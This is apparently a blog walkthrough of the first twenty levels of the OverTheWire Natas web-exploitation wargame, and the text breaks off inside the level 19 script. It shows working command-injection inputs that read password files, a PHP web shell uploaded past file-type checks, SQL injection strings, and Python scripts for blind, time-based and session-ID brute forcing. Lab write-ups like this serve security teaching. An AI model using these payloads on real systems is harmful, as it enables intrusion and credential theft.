Title: Exploiting the Web in 20 Lessons (Natas)
Date: 2014-10-16 6:01
Category: Web Security
Tags: Wargames, Python, BurpSuite, request, PHP, JavaScript, SQLi, Command_Injection, MySQL, XOR, Brute_Force


![cyber](http://i.imgur.com/ihtJsdE.png)

Continuing my quest through the [Wargames], today, I am going to talk about the 20 first levels of [Natas], the **web exploitation episode**.

I divide the exploits into two parts. The first part contains the easy challenges that don't demand much art (and are a bit boring). The second part comprehends the challenges that do, with scripting, brute force, and all the fun stuff.

Let the game begin.


[Wargames]: http://overthewire.org/wargames/
[Natas]: http://overthewire.org/wargames/natas/


----

## No scripting required here, Dude!

### Level 0 and 1: Simple source code inspection

The first two levels start with a simple HTML page. No hints.

The first thing we do is to take a look at the source code.

In the 0th level, the password is straight from the there.


In the first level, we need to disable **JavaScript** so you can right click it:

```html
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
```

Too easy.


### Level 2: Source code inspection for directories


Looking at the source code in the second level reveals:

```html
There is nothing on this page
<img src="files/pixel.png">
```

Well, this gives us a hint about the folder **files**.

Taking a look at:

> http://natas2.natas.labs.overthewire.org/files/


gives a file ```users.txt``` with the password.




### Level 3: Robots.txt

Looking at the source code, we see this comment:

```
<!-- No more information leaks!! Not even Google will find it this time... -->
```

In general, websites use a file called **[robots.txt]** to tell search engines what should be indexed.

Looking at:

> http://natas3.natas.labs.overthewire.org/robots.txt

[robots.txt]: http://en.wikipedia.org/wiki/Robots_exclusion_standard


We find:

```
User-agent: *
Disallow: /s3cr3t/
```

Looking at the content of the folder */s3cr3t/* revels:

```
Index of /s3cr3t

[ICO] Name Last modified Size Description
[DIR] Parent Directory -
[TXT] users.txt 12-Jul-2013 13:35 40
```

Which give us the password file:

> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt




### Level 4: Changing the referer tag

In this level, the front page shows this message:

```html
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```

The server thinks we are coming from a page that is indicated in the **[referer]** tag in the headers.

The referer is a (historically misspelled) tag that carries the address of the URL that linked to the address we are requesting.


There are many ways to tamper this. While we could use browser plugins such as [tampermonkey] or [modify-headers], the good old **curl** do it quickly:

[referer]: http://en.wikipedia.org/wiki/HTTP_referer


```sh
$ curl --user natas4:************************ http://natas4.natas.labs.overthewire.org/index.php --referer "http://natas5.natas.labs.overthewire.org/"
```


[tampermonkey]: https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en
[modify-headers]: https://chrome.google.com/webstore/detail/modify-headers-for-google/innpjfdalfhpcoinfnehdnbkglpmogdi?hl=en-US



### Level 5: Tampering cookies

When we log in the 5th level, the front page says:

```
Access disallowed. You are not logged in
```

Inspecting the source does not give any additional information.

We check the elements of the page. There is a cookie named *loggedin* with value **0**. What happens if we change it to **1**?

Using the [edit this cookie] plugin, we are able to edit it and get the next password.


[edit this cookie]: http://www.editthiscookie.com/start/



### Level 6: Source code inspection for directories II

This level comes with a PHP form. We take a look at the source code:

```php
<?
include "includes/secret.inc";

 if(array_key_exists("submit", $_POST)) {
 if($secret == $_POST['secret']) {
 print "Access granted. The password for natas7 is <censored>";
 } else {
 print "Wrong secret";
 }
 }
?>
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```

Double LOL.

We just need to inspect that first URL to get the value of *$secret*:

> http://natas6.natas.labs.overthewire.org/includes/secret.inc

Submitting this value in the input form gives us the password.


### Level 7: Modifying URLs

This level has the following hint in its PHP source code:

```html
<div id="content">
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

Another easy one.

Instead of *page=home* we change it to:

>page=/etc/natas_webpass/natas8

We then get our password at:

> http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8



### Level 8: String decoding

This level comes with a PHP form, similar to the 6th level. We take a look at the code source:

```php
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) {
 return bin2hex(strrev(base64_encode($secret)));
}
if(array_key_exists("submit", $_POST)) {
 if(encodeSecret($_POST['secret']) == $encodedSecret) {
 print "Access granted. The password for natas9 is <censored>";
 } else {
 print "Wrong secret";
 }
}
?>
```

Simple. The secret is encoded in some obscuration. Funny enough, it uses the PHP function [strrev] to reverse the string.

We perform the following operations to recover the variable *$secret* from the variable *$encodedSecret*:

I - Decode hexadecimal to binary (*bin2hex*):

```python
>>> SECRET.decode('hex')
'==QcCtmMml1ViV3b'
```


II - Reverse the string (*strrev*):

```python
>>> SECRET.decode('hex')[::-1]
'b3ViV1lmMmtCcQ=='
```

III - Base64 decode (*base64_encode*):

```python
>>> SECRET.decode('hex')[::-1].decode('base64')
'oubWYf2kBq'
```

We submit this last string in the input-form, giving us the password.


[strrev]: http://php.net/manual/en/function.strrev.php



------

## I'm bored. Can we do something actually cool?

Yes, we can.


### Level 9: OS Command Injection

This level's page has a search form. If we try to submit a word, for example *secret*, we get several variations of this word:

![cyber](http://i.imgur.com/ZQwlqsQl.png)



We inspect the source code:

```
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>
Output:
<pre>
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
 $key = $_REQUEST["needle"];
}
if($key != "") {
 passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

If we try inputs such as \*, "", or \n, the query shows the entire list of words inside the file *dictionary.txt*. We tried that, but no password there.

Taking a closer look to the code, we notice the PHP function [passthru](), which is used to execute an external command.

Since the variable **$key** is **not sanitized**, we can add a crafted input to it to inject a code that displays the password at the folder */etc/natas_webpass/natas10*. This type of attack is called [OS command injection].

What should we add to the original *grep* command?

In **Bash**, the *semicolon* permits putting more than one command on the same line. Adding a **;** to the input allows us to add a **cat** after that.

The crafted input is:
```
; cat /etc/natas_webpass/natas10
```
This gives us the password.




[passthru]: http://php.net/manual/en/function.passthru.php
[OS command injection]: https://www.owasp.org/index.php/OS_Command_Injection




### Level 10: OS Command Injection II

This level starts with the same search form from the previous level. However, this time, we get the warning:

> For security reasons, we now filter on certain characters.

We take a look at the source code:

```php
<pre>
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
 $key = $_REQUEST["needle"];
}
if($key != "") {
 if(preg_match('/[;|&]/',$key)) {
 print "Input contains an illegal character!";
 } else {
 passthru("grep -i $key dictionary.txt");
 }
}
?>
</pre>
```

The difference here is an *if* clause with the function [preg_match]. This function is used to search for a pattern in a string, *i.e.*, it clears the string against the pattern **;**, **|**, and **&**.

We cannot use the same attack as before with a semicolon!


We need to some other injection that does not need those symbols.

When I was messing around in the previous level, I noticed that we could use **""** as an input. Awesome. The following input reveals the password:

```
"" cat /etc/natas_webpass/natas11
```



[preg_match]: http://php.net/manual/en/function.preg-match.php




### Level 11: Cookies and XOR Encryption

This level starts with an input form to set background color and a message:

> cookies are protected with XOR encryption

![cyber](http://i.imgur.com/aD4CKbY.png)


Let's inspect the source code in several steps. First, we have this suspicious array:


```
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
```

We will see soon that this array is passed to a cookie as an encrypted XOR string.

[encrypted XOR string]:http://en.wikipedia.org/wiki/XOR_cipher


What happens if we manage to set *showpassword* to *yes*? This is answered in the end of the code:

```
if($data["showpassword"] == "yes") {
 print "The password for natas12 is <censored><br>";
}
```
We know our way now.


We then have this XOR function that takes an input value, *$text*, and XOR to a variable, *$key*. So we know that XORing the output with what we sent as the input can return the content of *$key*:

```
function xor_encrypt($in) {
 $key = '<censored>';
 $text = $in;
 $outText = '';

 // Iterate through each character
 for($i=0;$i<strlen($text);$i++) {
 $outText .= $text[$i] ^ $key[$i % strlen($key)];
 }
 return $outText;
}
```

The rest of the code is only important to show that the string encoded in *base64* before it's sent to the cookie. The function in the bottom just changes the color of the background:

```
function loadData($def) {
 global $_COOKIE;
 $mydata = $def;
 if(array_key_exists("data", $_COOKIE)) {
 $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
 if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
 if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
 $mydata['showpassword'] = $tempdata['showpassword'];
 $mydata['bgcolor'] = $tempdata['bgcolor'];
 }
 }
 }
 return $mydata;
}
function saveData($d) {
 setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
$data = loadData($defaultdata);
if(array_key_exists("bgcolor",$_REQUEST)) {
 if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
 $data['bgcolor'] = $_REQUEST['bgcolor'];
 }
}
saveData($data);
<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>
```


Since we know the plaintext, given by the variable *$defaultdata*, all we need is the value in the cookie. With that, we can XOR them and get our password.

We can use the plugin I described before, [edit this cookie], to get this value:

```
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw
```

Now, we write the following script in PHP, modifying the XOR function to take our input:
```
<?php
$cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw');
function xor_encrypt($in){
 $text = $in;
 $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
 $outText = '';

 for($i=0;$i<strlen($text);$i++) {
 $outText .= $text[$i] ^ $key[$i % strlen($key)];
 }
 return $outText;
}
print xor_encrypt($cookie);
?>
```

Running it returns the XOR key that encrypts the *$defaultdata* variable:
```sh
$ php xor.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

The repeated pattern is obviously a key.

The next step is to modify the value of that variable to have *showpassword* saying *yes*. Then this should be XORerd with the right key in *$key*.

For that, we created the following script:

```
<?php
function xor_encrypt_mod(){
 $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
 $key = 'qw8J';
 $outText = '';

 for($i=0;$i<strlen($text);$i++) {
 $outText .= $text[$i] ^ $key[$i % strlen($key)];
 }
 return $outText;
}
print base64_encode(xor_encrypt_mod());
?>
```

This results in the code we need to add to the cookie. We do this through the plugin. Refreshing the page returns our password.




### Level 12: File Inclusion Attack



This challenge starts with a JPG file uploader:
![cyber](http://i.imgur.com/xcSJ5kr.png)

Inspecting the source code, we see that the first function returns a random string of length 10:

```
function genRandomString() {
 $length = 10;
 $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
 $string = "";
 for ($p = 0; $p < $length; $p++) {
 $string .= $characters[mt_rand(0, strlen($characters)-1)];
 }
 return $string;
}
```

This string is used as the name of the uploaded file in the server:

```
function makeRandomPath($dir, $ext) {
 do {
 $path = $dir."/".genRandomString().".".$ext;
 } while(file_exists($path));
 return $path;
}
function makeRandomPathFromFilename($dir, $fn) {
 $ext = pathinfo($fn, PATHINFO_EXTENSION);
 return makeRandomPath($dir, $ext);
}
```

However, this file's extension is given by the browser:

```
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```


Finally, the last function performs the file uploading. Notice that the code does not check whether the file is actually a JPG file:


```
if(array_key_exists("filename", $_POST)) {
 $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
 if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
 echo "File is too big";
 } else {
 if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
 echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
 } else{
 echo "There was an error uploading the file, please try again!";
 }
 }
} else {
?>
```

#### Stating the attack:

We still can upload whatever file we want.

Since the file extension is changed to *jpg* in the browser side, we have control of this; we can easily tamper the POST data.

First, let's think about the exploit we want to send to the server. Since we know that the server runs PHP, we have several possibilities in this language!

How about the following script which uses the function [readfile()]?

```
<?php
readfile('/etc/natas_webpass/natas13');
?>
```

[readfile()]: http://php.net/manual/en/function.readfile.php

We could also use a [system] command:

```php
<?php
system("cat /etc/natas_webpass/natas13");
?>
```

[system]: http://php.net/manual/en/function.system.php

Or we could even use [passthru] again:

```php
 <?php
 passthru($_GET['cmd']);
 ?>
```
Any of these exploits will work.





Now, let's work our way around the fact that the browser will attempt to change our script extension from *php* to *jpg*.

There are several ways to fix this. An easy way is to use a proxy or extension, such as [Burp Suite] or [FireBug] to change the filename before it is sent to the server.

We use *Burp* and the attack is stated in the following steps:

1. Our exploit script in PHP is uploaded by the server and renamed with a random string and a *jpg* extension.

2. We intercept the request and change the name of the file back to the name of the script with *php* extension.

3. We send it to the server, which calls the function *MakeRandomPathFromFilename("upload","exploit.php")*. This is sent to the function MakeRandomPath('upload', '.php').

4. The server returns the link */upload/randomString.php*, which runs our exploit and returns the password.


#### Firing up Burp:

[Burp Suite]: http://portswigger.net/burp/
[FireBug]: http://getfirebug.com/

If this is your first time with Burp, [this is how you run it]. Burp works as an HTTP proxy server, where all HTTP/S traffic from your browser passes through it. I will show in details how to do this in a *nix system.


[this is how you run it]: http://portswigger.net/burp/help/suite_gettingstarted.html

First, we lauch Burp:

```sh
$ java -jar -Xmx1024m /path/to/burp.jar
```

Then we go to the proxy tab and then options, and we confirm Burp's Proxy listener is active at *127.0.0.1:8080*:

![cyber](http://i.imgur.com/5xkHB29.png)

We set the proxy configuration in our system to this address:

![cyber](http://i.imgur.com/Au1Gimm.png)

Back in Burp, we go to *Proxy --> Intercept* and mark it ON:

![cyber](http://i.imgur.com/FAf5Hru.png)

In the browser, we load the Natas12 page and accept the initial intercepts (forwarding it). We upload our exploit.

Before we forward this request to the server, we open it in Burp and we change the name of the random string in *jpg* to our *php* exploit:

![cyber](http://i.imgur.com/eywDMOy.png)


The browser will return the link for the file:

![cyber](http://i.imgur.com/SGjbVsy.png)

Clicking it will reveal the password.


### Level 13: File Inclusion Attack II



This level looks like the previous one, except by the message:

> For security reasons, we now only accept image files!

We take a look at the source code and the only difference from the previous level's code is an *if* clause:
```php
<?
if(array_key_exists("filename", $_POST)) {
 $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
 if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
 echo "File is too big";
 } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
 echo "File is not an image";
 } else {
 if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
 echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
 } else{
 echo "There was an error uploading the file, please try again!";
 }
 }
} else {
?>
```

The clause uses the PHP function [exif_imagetype] to check whether the file is an image type.

The way it works is by checking the first bytes of the image and seeing whether it has an image signature. This signature is known as the [magic number]. Every binary has one.

It should be obvious that adding the right signature to a file could tamper it to look like another file type.

#### Crafting the attack:

We search for an [image magic number]. For *jpg*, it's the hexadecimal *ff d8 ff e0*. For *gif*, however, it's really simple: *GIF89a*.

Let's use it!

Adding this number to our script from the previous level,

```
GIF89a
<?php
readfile('/etc/natas_webpass/natas14');
?>
```

and following the previous steps, leads to the password for the next level.


[exif_imagetype]:http://php.net/manual/en/function.exif-imagetype.php
[magic number]:http://en.wikipedia.org/wiki/List_of_file_signatures
[image magic number]:http://en.wikipedia.org/wiki/Graphics_Interchange_Format



### Level 14: SQL Injection



This level starts with a *username* and *password* form:

![cyber](http://i.imgur.com/qDA3nCP.png)

Looking at the source code, we see THE connection to a MySQL server, and a SQL query to look for a record in the database:

```php
<?
if(array_key_exists("username", $_REQUEST)) {
 $link = mysql_connect('localhost', 'natas14', '<censored>');
 mysql_select_db('natas14', $link);

 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
 if(array_key_exists("debug", $_GET)) {
 echo "Executing query: $query<br>";
 }

 if(mysql_num_rows(mysql_query($query, $link)) > 0) {
 echo "Successful login! The password for natas15 is <censored><br>";
 } else {
 echo "Access denied!<br>";
 }
 mysql_close($link);
} else {
?>
```

If the query returns one or more row, we get a message with the password for the next level.

The *GET* in the *if* clause declares the parameter *debug* without checking whether this is a safe query input!

Therefore, while a simple GET query such as:

> http://natas14.natas.labs.overthewire.org/index.php?username=admin&password=pass

returns:

![cyber](http://i.imgur.com/mWhSVxh.png)


A crafted query using [SQL Injection] (SQLi) can return whatever we want :).

#### Crafting the attack:

Without any injection, a regular query with words *admin* and *pass* would look like this:
```
SELECT * from users where username="$(Username)" and password="$(Password)"
```

We want to inject stuff in the middle to make this query do *more things*.

In SQLi, we need to take care of the **"** that is automatically added in the end by the server. The simplest way to do this is by including an **always true clause** at the end of everything. It can be represented by:

```
OR '1'='1'
```

So, for example, the following query would not give any error:

```
SELECT * from users where username="admin" and password="pass" OR "1"="1"
```

Now, we need to add stuff before OR!

When we craft the right URL, we keep in mind that whitespace will be translated to *%20* and **""** will be translated to *%22*.

Finally, the following URL:

> http://natas14.natas.labs.overthewire.org/index.php?username=admin&password=pass%22%20OR%20%221%22=%221

reveals the password.



[SQL Injection]: https://www.owasp.org/index.php/SQL_Injection



----

## Now the Juice: Scripting Attacks



### Level 15: SQL Injection II



This level starts with a form to check the existence of some username:

![cyber](http://i.imgur.com/SO4K5wK.png)

 The source code is almost equal to the previous level, with the exception of this part:

```
/*
CREATE TABLE `users` (
 `username` varchar(64) DEFAULT NULL,
 `password` varchar(64) DEFAULT NULL
);
*/
```

And the fact that the *$query* does not have a password part and it is hygienized now:

```
if(array_key_exists("username", $_REQUEST)) {
 $link = mysql_connect('localhost', 'natas15', '<censored>');
 mysql_select_db('natas15', $link);
 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
 if(array_key_exists("debug", $_GET)) {
 echo "Executing query: $query<br>";
 }
 $res = mysql_query($query, $link);
 if($res) {
 if(mysql_num_rows($res) > 0) {
 echo "This user exists.<br>";
 } else {
 echo "This user doesn't exist.<br>";
 }
 } else {
 echo "Error in query.<br>";
 }
 mysql_close($link);
} else {
?>
```

We can't just modify the query to return a record because it won't accept **"**.

However, additional information about the table's proprieties is enough for us! We are going to brute force it!

#### Stating the Attack:

If we check the existence of the users *nata15* or *natas17*, we get:

> The user doesn't exist.

However, if we check for *natas16* we verify that this user exists! Now we just need a password.

Since checking this *natas16* will always return true, we can inject another clause to the query using the keyword AND:


```
SELECT * from users where username="natas16" AND our_exploit
```

To pick this additional clause, we look at the [SQL wildcards and keywords]

We can use the SQL function [SUBSTRING] and the symbol **%** to compare strings. For example, the following checks whether there is an **a** in the third position of the variable password:



[SQL wildcards and keywords]: http://www.w3schools.com/sql/sql_wildcards.asp
[SUBSTRING]: http://www.1keydata.com/sql/sql-substring.html

```
AND SUBSTRING(password,3,1) = BINARY "a"
```

If SUBSTRING returns false, the entire query becomes false because of the **AND**, and we see the message:

> This user doesn’t exist.

If it returns true, we see

> This user exists.

Beautiful.

#### Crafting the attack:

We use Python's [request] library to craft our attack:

[request]: http://docs.python-requests.org/en/latest/user/quickstart/

```python
import requests
import string

def brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2, KEYWORD):
 password = ''
 for i in range(1, LENGTH+1):
 for j in range (len(CHARS)):
 r = requests.get( ( SQL_URL1 + str(i) + SQL_URL2 + CHARS[j] ), auth=AUTH)
 print r.url
 if KEYWORD in r.text:
 password += CHARS[j]
 print("Password so far: " + password)
 break
 return password

if __name__ == '__main__':
 # authorization: login and password
 AUTH = ('natas15', '*******************************')

 # BASE64 password and 32 bytes
 CHARS = string.ascii_letters + string.digits
 LENGTH = 32

 # crafted url option 1
 SQL_URL1 = 'http://natas15.natas.labs.overthewire.org?username=natas16" AND SUBSTRING(password,'
 SQL_URL2 = ',1) LIKE BINARY "'
 KEYWORD = 'exists'

 print(brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2, KEYWORD))
```

After around 10 minutes we have our password.

### Level 16: OS Command Injection III



This level starts with a searching form:

![cyber](http://i.imgur.com/kMHZzZ9.png)

The source code is similar to the 9th and 10th levels:
```
<pre>
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
 $key = $_REQUEST["needle"];
}
if($key != "") {
 if(preg_match('/[;|&`\'"]/',$key)) {
 print "Input contains an illegal character!";
 } else {
 passthru("grep -i \"$key\" dictionary.txt");
 }
}
?>
</pre>
```

The difference now is that the code is being hygienized for **`**, **"**, and **'**. The old attack adding **""** won't work.

We need to figure out what else we can use.


Bash has a feature called [command substitution], where commands can be passed with:
```
$(command)
```

For example, the date command:

```sh
$ MY_CMD="$(date)"
$ echo $MY_CMD
Wed Oct 14 20:23:41 EDT 2014
```

[command substitution]: http://www.tldp.org/LDP/abs/html/commandsub.html

#### Stating the attack:

We are going to use command substitution to craft command in the variable *$key*, which lies inside:

```
grep -i \"$key\" dictionary.txt
```
We are going to add another grep! Let's call it *grep II*.

This time we will give it the flag ```-E``` to allow the use of regular expressions.


So, for example, we can use the *regex wildcard* **.\*** to search for a char (say *a*) in the password string:


```
$(grep -E ^a.* /etc/natas_webpass/natas17)banana
```

If *grep II* finds a match, it returns the char. In the other case, it won't return any output.

Once *grep II* is over, *grep I* will do the regular search for the pattern we passed (banana).

If *grep II* didn't return anything, a banana will be banana. If *grep II* returns a match, a banana will have this extra string added to it (abanana).

Now we can extend this logic to each char in the password string.

#### Crafting the attack:

By inspection, we see that the crafted URL to check, say, *a* in the first char, should look like this:

> http://natas16.natas.labs.overthewire.org/?needle=$(grep%20-E%20^a.*%20/etc/natas_webpass/natas17)banana&submit=Search

So we can write the following script:


```python
import requests
import string

def brute_force_password(LENGTH, AUTH, CHARS, URL1, URL2):
 password = ''
 for i in range(1, LENGTH+1):
 for j in range (len(CHARS)):
 print("Position %d: Trying %s ..." %(i, CHARS[j]))
 r = requests.get( ( URL1 + password + CHARS[j] + URL2 ), auth=AUTH)
 if 'bananas' not in r.text:
 password += CHARS[j]
 print("Password so far: " + password)
 break
 return password

if __name__ == '__main__':
 # authorization: login and password
 AUTH = ('natas16', '****************************')

 # BASE64 password and 32 bytes
 CHARS = string.ascii_letters + string.digits
 LENGTH = 32

 # crafted url
 URL1 = 'http://natas16.natas.labs.overthewire.org?needle=$(grep -E ^'
 URL2 = '.* /etc/natas_webpass/natas17)banana&submit=Search'

 print(brute_force_password(LENGTH, AUTH, CHARS, URL1, URL2))
```



Around 10 minutes later, we get our password.



### Level 17: SQL Injection III



This level starts with a username search similar from the 14th and 15th levels:


```
/*
CREATE TABLE `users` (
 `username` varchar(64) DEFAULT NULL,
 `password` varchar(64) DEFAULT NULL
);
*/
if(array_key_exists("username", $_REQUEST)) {
 $link = mysql_connect('localhost', 'natas17', '<censored>');
 mysql_select_db('natas17', $link);
 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
 if(array_key_exists("debug", $_GET)) {
 echo "Executing query: $query<br>";
 }
 $res = mysql_query($query, $link);
 if($res) {
 if(mysql_num_rows($res) > 0) {
 //echo "This user exists.<br>";
 } else {
 //echo "This user doesn't exist.<br>";
 }
 } else {
 //echo "Error in query.<br>";
 }
 mysql_close($link);
} else {
?>
```


The difference now is that the echo commands are commented off. We can't use the same method as before to check whether we got a right char in the password.

What other ways we can have binary indicator?

We can play with time!

#### Stating the Attack:

Luckily, MySQL has a query [sleep()] that delays the next command for a number of seconds. We can use this as an injected command at the end of our former exploits:

[sleep()]: http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_sleep

```
AND SUBSTRING(password,3,1)) LIKE BINARY AND SLEEP(5) AND "1"="1
```

Notice that since SLEEP() does not carry a **"** we use the *always true* clause to close the **"** added by the server.


A crafted URL should look like this:

> http://natas15.natas.labs.overthewire.org/?username=natas16%22%20AND%20SUBSTRING(password,1,1)%20LIKE%20BINARY%20%22d%22%20AND%20SLEEP(320)%20AND%20%221%22=%221

#### Crafting the Attack:

The new script is:

```python
import requests
import string

def brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2):
 password = ''
 for i in range(1, LENGTH+1):
 for j in range (len(CHARS)):
 r = requests.get( ( SQL_URL1 + str(i) + SQL_URL2 + CHARS[j] + SQL_URL3 ), auth=AUTH)
 time = r.elapsed.total_seconds()
 print("Position %d: trying %s... Time: %.3f" %(i, CHARS[j], time))
 #print r.url
 if time >= 9:
 password += CHARS[j]
 print("Password so far: " + password)
 break
 return password

if __name__ == '__main__':
 # authorization: login and password
 AUTH = ('natas17', '****************************')

 # BASE64 password and 32 bytes
 CHARS = string.ascii_letters + string.digits
 LENGTH = 32

 # crafted url
 SQL_URL1 = 'http://natas17.natas.labs.overthewire.org?username=natas18" AND SUBSTRING(password,'
 SQL_URL2 = ',1) LIKE BINARY "'
 SQL_URL3 = '" AND SLEEP(10) AND "1"="1'

 print(brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2))
```

Around 15 minutes later, I got the password.



### Level 18: Hijacking Session ID



The 18th level starts with a login form, just like the levels before it. The source code is much more intricate though.

First, we see the declaration of the size of the id. This is important if we want to brute force the solution:

```
$maxid = 640; // 640 should be enough for everyone
```

Then we have a function that checks whether a variable *$id* is a number with the PHP function [is_numeric]:

[is_numeric]: http://php.net/manual/en/function.is-numeric.php

```
function isValidID($id) { /* {{{ */
 return is_numeric($id);
}
```


Then we have this main object:
```
$showform = true;
if(my_session_start()) {
 print_credentials();
 $showform = false;
} else {
 if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
 session_id(createID($_REQUEST["username"]));
 session_start();
 $_SESSION["admin"] = isValidAdminLogin();
 debug("New session started");
 $showform = false;
 print_credentials();
 }
}
if($showform) {
?>
```
The next function create an random id number with the value defined by *$maxid*:
```php
function createID($user) { /* {{{ */
 global $maxid;
 return rand(1, $maxid);
}
```

This checks whether the function *my_session_start()* is true:

```
function my_session_start() { /* {{{ */
 if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
 if(!session_start()) {
 debug("Session start failed");
 return false;
 } else {
 debug("Session start ok");
 if(!array_key_exists("admin", $_SESSION)) {
 debug("Session was old: admin flag set");
 $_SESSION["admin"] = 0; // backwards compatible, secure
 }
 return true;
 }
 }
 return false;
}
```


In the case it's true, a function that prints the credentials is called, printing our password:

```
function print_credentials() { /* {{{ */
 if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
 print "You are an admin. The credentials for the next level are:<br>";
 print "<pre>Username: natas19\n";
 print "Password: <censored></pre>";
 } else {
 print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
 }
}
```

If *%my_session* is not true, it will look to the HTTP request and search for username and password. If it finds them, it creates a session id:

```
function isValidAdminLogin() { /* {{{ */
 if($_REQUEST["username"] == "admin") {
 /* This method of authentication appears to be unsafe and has been disabled for now. */
 //return 1;
 }
 return 0;
```






So, in summary, we have a function that starts the session, first checking if the session id is in the cookie, and if this session id is a number. If true, it checks if it's a fresh session. Then, it checks if the word *admin* is in [SESSION_ID]. If not, it invalidates the session.

[SESSION_ID]: http://en.wikipedia.org/wiki/Session_ID

If the SESSION_ID is the admin session ID, the password for the next is shown.

After that, it calls PHP's [session_starts()].

The session ID is given by the variable *PHPSESSID*, and that's what we are going to brute force to get our password.






The variable [$_REQUEST] is an array that by default contains the contents of *$_GET*, *$_POST* and *$_COOKIE*.

[$_REQUEST]: http://php.net/manual/en/reserved.variables.request.php

[session_starts()]: http://php.net/manual/en/function.session-start.php

#### Crafting the attack:

We write the following script:

```python
import requests

def brute_force_password(AUTH, URL, PAYLOAD, MAXID):
 for i in range(MAXID):
 HEADER ={'Cookie':'PHPSESSID=' + str(i)}
 r = requests.post(URL, auth=AUTH, params=PAYLOAD, headers=HEADER)
 if "You are an admin" in r.text:
 print(r.text)
 print(r.url)
 print(str(i))

if __name__ == '__main__':
 AUTH = ('natas18', '*************************')
 URL = 'http://natas18.natas.labs.overthewire.org/index.php?'

 PAYLOAD = ({'debug': '1', 'username': 'user', 'password': 'pass'})
 MAXID = 640

 brute_force_password(AUTH, URL, PAYLOAD, MAXID)
```

After a few minutes, we get our password.



















### Level 19: Hijacking Session ID II



This level looks exactly like the previous except that it has the following message:

> This page uses mostly the same code as the previous level, but session IDs are no longer sequential ...

![cyber](http://i.imgur.com/OQ7LATt.png)


This time we have no access to the source code to see how the session IDs are created. However, we have access to the values in the cookie which are created by the session.

We write the following snippet:

```python
HEADER ={'Cookie':'PHPSESSID=' + str(i)}
r = requests.post(URL, auth=AUTH, params=PAYLOAD, headers=HEADER)
print(i)
print(HEADER[1])
```

This produces the following output:

```
0
{'PHPSESSID': '3236312d75736572'}
1
{'PHPSESSID': '3136372d75736572'}
2
{'PHPSESSID': '3534342d75736572'}
3
{'PHPSESSID': '3238352d75736572'}
4
{'PHPSESSID': '3334332d75736572'}
(...)
```

So the session ID is an hexadecimal number. Let's decode it:

```python
id_hex = requests.utils.dict_from_cookiejar(r.cookies)['PHPSESSID']
print(id_hex.decode('hex'))
```

Mmmm, interesting:

```
0
548-user
1
275-user
2
237-user
3
90-user
4
535-user
(...)
```

The session ID is really a random number (below 640) attached to the given username. That's easy.

#### Crafting the attack:


We write the following script:

```python
import requests

def brute_force_password(AUTH, URL, PAYLOAD, MAXID):
 for i in range(MAXID):
